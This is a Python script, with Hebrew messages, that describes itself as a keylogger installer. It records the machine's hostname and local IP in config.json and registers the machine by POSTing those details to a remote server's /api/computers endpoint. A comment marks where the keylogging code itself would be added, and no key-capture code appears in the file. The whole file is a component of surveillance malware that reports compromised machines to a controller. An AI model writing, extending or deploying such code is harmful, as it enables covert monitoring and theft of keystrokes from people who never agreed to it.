
import os
import sys
import json
import socket
import argparse
import shutil


def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


def create_config(server_ip, machine_name=None):
    if not machine_name:
        machine_name = socket.gethostname()

    config = {
        "server_ip": server_ip,
        "machine_name": machine_name,
        "machine_ip": get_local_ip()
    }

    with open("config.json", "w") as f:
        json.dump(config, f)

    print(f"הגדרות נוצרו עבור מחשב: {machine_name}, IP: {config['machine_ip']}")
    return config


def register_with_server(config):
    try:
        import requests
        response = requests.post(
            f"http://{config['server_ip']}:5001/api/computers",
            json={
                "name": config['machine_name'],
                "ip": config['machine_ip']
            }
        )
        if response.status_code == 200:
            print("המחשב נרשם בהצלחה בשרת")
            return True
        else:
            print(f"שגיאה ברישום מחשב: {response.status_code}, {response.text}")
            return False
    except Exception as e:
        print(f"שגיאה בתקשורת עם השרת: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(description='התקנת Keylogger')
    parser.add_argument('--server', help='כתובת IP של השרת', required=True)
    parser.add_argument('--name', help='שם המחשב (אופציונלי)')
    args = parser.parse_args()

    config = create_config(args.server, args.name)

    # ניסיון להירשם בשרת
    success = register_with_server(config)

    if success:
        print("ההתקנה הושלמה בהצלחה")
        # כאן אפשר להוסיף קוד להפעלת ה-keylogger
    else:
        print("ההתקנה נכשלה, נסה שוב או בדוק את הגדרות השרת")


if __name__ == "__main__":
    main()